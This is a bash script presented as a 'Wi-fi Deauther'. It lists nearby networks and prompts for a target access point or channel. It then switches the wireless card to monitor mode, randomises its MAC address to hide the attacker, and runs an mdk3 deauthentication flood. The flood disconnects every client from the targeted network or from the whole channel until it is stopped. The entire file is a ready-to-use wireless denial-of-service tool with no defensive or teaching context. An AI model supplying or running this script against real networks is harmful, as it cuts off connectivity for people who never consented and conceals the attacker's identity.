#!/bin/bash

# TERMINAL COLORS
NO_COLOR="\e[0m"
WHITE="\e[0;17m"
BOLD_WHITE="\e[1;37m"
BLACK="\e[0;30m"
BLUE="\e[0;34m"
BOLD_BLUE="\e[1;34m"
GREEN="\e[0;32m"
BOLD_GREEN="\e[1;32m"
CYAN="\e[0;36m"
BOLD_CYAN="\e[1;36m"
RED="\e[0;31m"
BOLD_RED="\e[1;31m"
PURPLE="\e[0;35m"
BOLD_PURPLE="\e[1;35m"
BROWN="\e[0;33m"
BOLD_YELLOW="\e[1;33m"
GRAY="\e[0;37m"
BOLD_GRAY="\e[1;30m"
# END OF TERMINAL COLORS

function coolexit()
{
	clear
	sleep 2
	ifconfig $WI down
	macchanger -p $WI
	iwconfig $WI mode managed
	ifconfig $WI up
	clear
	title
	echo -e $BOLD_RED
	echo " Thanks for using this script"
	echo -e " My GitHub:$BOLD_WHITE https://github.com/vansh7900"
	exit
}

function title() {
	echo -e $BOLD_GREEN
	echo "     "
	echo "                                                                                                 "
    echo           "     | / / _ | / |/ / __/ // / /    | | /| / (_)___/ __/  _/    / _ \___ ___ ___ __/ /_/ / "
    echo             "   | |/ / __ |/    /\ \/ _  /     | |/ |/ / /___/ _/_/ /     / // / -_) _ `/ // / __/ _ \ "
    echo             "   |___/_/ |_/_/|_/___/_//_/      |__/|__/_/   /_/ /___/    /____/\__/\_,_/\_,_/\__/_//_/ "
	echo -e $BOLD_WHITE
	echo "				Wi-fi Deauther by Vansh"
}

function getIFCARD() {
        echo -e "$BOLD_GREEN   Your interfaces: "
        echo -e -n "$BOLD_WHITE"
        ifconfig | grep -e ": " | sed -e 's/: .*//g' | sed -e 's/^/   /'
        echo " "
        echo -n -e "$BOLD_CYAN   Type your wireless interface > "
        echo -n -e "$BOLD_WHITE"
}

function changeMAC() {
        ifconfig $WI down
        iwconfig $WI mode monitor
        macchanger -r $WI
        ifconfig $WI up
}

title
echo -e $BOLD_CYAN
echo " Choose an option:"
echo " "
echo -e "$BOLD_BLUE 1.$BOLD_WHITE Deauth a specific BSSID"
echo -e "$BOLD_BLUE 2.$BOLD_WHITE Deauth a whole channel"
echo " "
echo -n -e "$BOLD_WHITE > "
read CHOICE
clear

if [ $CHOICE == 1 ]; then
	title
	echo -e $NO_COLOR
	nmcli dev wifi
	echo " "
	echo -e -n $BOLD_CYAN
	echo -n " Type the target BSSID > "
	echo -e -n $BOLD_WHITE
	read BSSID
	clear
	title
	echo " "
	getIFCARD
	read WI
	echo " "
	echo -e $BOLD_GREEN
	echo "Starting the attack... Press CTRL+C to stop the attack."
	changeMAC
	trap coolexit EXIT
	mdk3 $WI d -t "$BSSID"
elif [ $CHOICE == 2 ]; then
	title
	echo -e $NO_COLOR
	nmcli dev wifi
	echo " "
	echo -e -n $BOLD_CYAN
	echo -n " Type the target channel > "
	echo -e -n $BOLD_WHITE
	read CH
	clear
	title
	echo " "
	getIFCARD
	read WI
	echo " "
 	echo -e $BOLD_GREEN
	echo -e "Starting the attack... Press CTRL+C to stop the attack."
	changeMAC
	trap coolexit EXIT
	mdk3 $WI d -c $CH
else
	echo -e $BOLD_RED Invalid option
	sleep 3
	coolexit
fi
